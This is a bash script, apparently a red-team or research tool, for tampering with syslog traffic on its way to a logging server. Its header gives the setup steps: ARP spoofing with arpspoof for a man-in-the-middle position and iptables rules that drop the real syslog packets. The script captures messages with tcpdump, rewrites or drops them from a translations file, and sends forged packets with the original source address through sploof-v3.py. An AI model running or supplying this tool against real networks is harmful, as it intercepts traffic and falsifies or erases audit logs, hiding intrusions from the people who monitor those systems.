#!/bin/bash

# Created By: Michael J. Hankins
# Last Modified: 03/16/2017
# Description: This script is used to modify syslog data on its way to the syslog server.
#
# Prerequisites:
#     1) If using a wireless network, set the adapter on the Attack Platform (AP) to Monitor mode with the following commands:
#        (switched wired networks require additional steps not listed below to intercept the packets)
#			ifconfig wlan0 down
#			iwconfig wlan0 mode monitor
#			ifconfig wlan0 up
#
#     2) Enable IP forwarding on the AP with the following command:
#           echo 1 > /proc/sys/net/ipv4/ip_forward
#
#     3) Set up ARP Man-in-the-Middle (MITM) by running the following commands in separate windows
#           arpspoof -t <IP of host to catch traffic from> <IP of syslog server>
#           arpspoof -t <IP of syslog server> <IP of host to catch traffic from>
#
#     4) Configure iptables to drop all outbound syslog packets from the AP using the following command:
#           /sbin/iptables -A OUTPUT -p udp --destination-port 514 -j DROP
#           /sbin/iptables -A FORWARD -p udp --destination-port 514 -j DROP
#
#           (to remove the rules, use the following commands):
#           /sbin/iptables -D OUTPUT -p udp --destination-port 514 -j DROP
#           /sbin/iptables -D FORWARD -p udp --destination-port 514 -j DROP
#
#     5) All desired packet modifications need to be in the packet_translations.txt file in the same dir as this script
#
#     6) The sploof-v3.py tool needs to be located in the same dir as this script
#
#     7) Run this script using the following syntax:
#           ./packet_sanitizer.sh <target_host_ip>
#
# Functionality:
#     This script creates an active buffer of the tcpdump stream for syslog data from the target host.
#     As the packets are captured, the script strips out any needed data and recreates the packets
#     using sploof-v3.py, replacing any translations found in the packet_translations.txt file.  Sploof
#     then sends the modified packet on its way to the syslog server.  The actual syslog data that was
#     captured by the MITM AP will be dropped due to the iptables rules, while only the sanitized Sploof
#     messages will make it to the syslog server.  Rather than trying to directly modify the data stream
#     in real-time, this script captures the stream data, stops the packet from continuing, then creates
#     and sends its own falsified packet on to the syslog server.


#######################
#######################
### START OF SCRIPT ###
#######################
#######################

# Save the target IP Address from the command argument
IP_ADDRESS=$1

# Save the locations of the other required files
TRANSLATIONS_LOC="$(dirname "${BASH_SOURCE[0]}")/packet_translations.txt"
SPLOOF_LOC="$(dirname "${BASH_SOURCE[0]}")/sploof-v3.py"

# Ensure that the user has provided a valid IP argument with the command
if [[ -z "$IP_ADDRESS" ]] || [[ -z `echo "$IP_ADDRESS" | grep -oE "^\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"` ]]
	then
		# Notify the user of the syntax
		echo ""
		echo "Target system IP was either not provided or was malformed."
		echo ""
		echo "Script Syntax:"
		echo "   ./packet_sanitizer.sh <target_host_ip>"
		echo ""
		echo "Exiting script..."
		echo ""

		# Exit the script
		return
fi

# Ensure that the packet_translations.txt file exists
if [[ ! -e "$TRANSLATIONS_LOC" ]]
	then
		# Notify the user of the syntax
		echo ""
		echo "translations.txt file must exist in same dir as this script."
		echo ""
		echo "Exiting script..."
		echo ""

		# Exit the script
		return
fi

# Ensure that the sploof-v3.py file exists
if [[ ! -e "$SPLOOF_LOC" ]]
	then
		# Notify the user of the syntax
		echo ""
		echo "sploof-v3.py file must exist in same dir as this script."
		echo ""
		echo "Exiting script..."
		echo ""

		# Exit the script
		return
fi

# Notify user that the script is starting
echo ""
echo "Starting packet sanitizer..."
echo "Initializing variables"
echo ""

# Initialize any variables that will be used in the loop
SOURCE_IP=""
DEST_IP=""
ORIG_MESSAGE=""
NEW_STRING=""

# Notify user that tcpdump is starting
echo "Starting tcpdump stream capture"
echo "Capturing packets on UDP port 514 from $IP_ADDRESS"
echo "(press ctrl+c to quit)"
echo ""

# Create a live stream of the tcpdump data for UDP port 514 from the target IP to process in real-time
stdbuf -oL tcpdump udp port 514 and host $IP_ADDRESS and not arp -v |
   while IFS= read -r LINE
		do
			# Check if line starts with a timestamp (meaning it's a new packet)
			if [[ -n `echo "$LINE" | egrep '^[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{6}'` ]]
				then
					# Re-initialize any variables
					SOURCE_IP=""
					DEST_IP=""
					ORIG_MESSAGE=""
					NEW_STRING=""

					# Get the packet ID number
					PACKET_ID=`echo "$LINE" | grep -o "id [0-9]*" | awk '{ print $2 }'`
			
			# Check if the line starts with an IP address
			elif [[ -n `echo "$LINE" | grep -oE "^[[:space:]]*\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"` ]]
				then
					# Carve the source and destination IPs from the packet
					SOURCE_IP=`echo "$LINE" | grep -oE "[[:space:]]*\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" | tr -d '\n' | awk '{ print $1 }'`
					DEST_IP=`echo "$LINE" | grep -oE "[[:space:]]*\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" | tr -d '\n' | awk '{ print $2 }'`

			# Check if the line contains the syslog message
			elif [[ -n `echo $LINE | grep -oE "^[[:space:]]*Msg:"` ]]
				then
					# Save the original message (trimming off any leading whitespace)
					ORIG_MESSAGE=`echo $LINE | awk '{$1=$2=$3=$4=""; print $0}' | sed "s/^[ \t]*//"`

					# Initialize variables to hold any search or replace strings from packet_translations.txt
					SEARCH_STRING=""
					REPLACEMENT_STRING=""

					# Initialize a variable to hold the modified packet message
					NEW_STRING=""

					# Set a flag to know if to drop the message
					DROP_MESSAGE="false"

					# If the new packet is still empty, copy the message data out of the original message
					if [[ "$NEW_STRING" = "" ]]
						then
							NEW_STRING="$ORIG_MESSAGE"
					fi

					# Iterate through packet_translations.txt, replacing any strings found in that file
					while read -r TRANS_LINE
						do
								# Process the current line of packet_translations.txt if it is not empty or a comment
					    		if [[ -z `echo "$TRANS_LINE" | egrep '^[[:space:]]*#'` ]] && [[ ! "$TRANS_LINE" = "" ]]
									then
										# Gather the search and replace strings from the current line of the file
										SEARCH_STRING=`echo "$TRANS_LINE" | awk -F'<<>>' '{ print $1 }'`
										REPLACEMENT_STRING=`echo "$TRANS_LINE" | awk -F'<<>>' '{ print $2 }'`

										# Process the replacements if the action is to DROP the message
										if [[ ! "$REPLACEMENT_STRING" = "DROP" ]]
											then
												# Replace all instances of the search string in the current message
												NEW_STRING=`echo "$NEW_STRING" | sed "s/$SEARCH_STRING/$REPLACEMENT_STRING/g"`
											else
												# Set the DROP flag if the search string is found with a DROP command
												if [[ -n `echo "$NEW_STRING" | grep -i "$SEARCH_STRING"` ]]
													then
														# Set the flag to DROP the message
														DROP_MESSAGE="true"

														# Break out of the loop
														break
												fi
										fi
									
							fi
					done < <(cat "$TRANSLATIONS_LOC")

					# Process the message if the packet is not being dropped
					if [[ "$DROP_MESSAGE" = "true" ]]
						then
							echo ""
							echo "   Packet $PACKET_ID was dropped"
							echo "      Original Message: $ORIG_MESSAGE"
							echo "      Modified Message: $NEW_STRING"
							echo "   Sending new packet $PACKET_ID nowhere"
							echo ""
						else
							# Write output to screen if the packet was modified
							if [[ ! "$NEW_STRING" = "$ORIG_MESSAGE" ]]
								then
									echo ""
									echo "   Packet $PACKET_ID was modified"
									echo "      Original Message: $ORIG_MESSAGE"
									echo "      Modified Message: $NEW_STRING"

									# Notify the user that the new packet is being crafted and sent
									echo "   Sending new packet $PACKET_ID to syslog server $DEST_IP"
									echo ""
							fi

							# Run Sploof to send the newly crafted message with the original source and dest IP addresses
							python "$(dirname "${BASH_SOURCE[0]}")/sploof-v3.py" $SOURCE_IP $DEST_IP "$NEW_STRING" -u 514 1>/dev/null 2>/dev/null
					fi
			fi
	done
